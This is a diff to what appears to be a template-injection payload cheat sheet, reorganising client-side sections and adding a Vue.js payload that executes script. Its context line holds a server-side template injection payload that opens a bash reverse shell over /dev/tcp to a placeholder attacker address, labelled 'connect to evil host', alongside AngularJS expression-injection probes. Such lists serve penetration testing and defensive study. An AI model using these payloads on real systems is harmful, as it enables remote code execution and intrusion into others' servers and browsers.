@@ -201,13 +201,19 @@ Inject this template
 {{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
 ```
 
-## AngularJS
+## Client Side Template Injection
 
-### AngularJS - Basic injection
+### AngularJS
 
 ```javascript
 $eval('1+1')
 {{1+1}}
+```
+
+### Vue JS
+
+```javascript
+{{constructor.constructor('alert(1)')()}}
 ```
 
 ## Thanks to
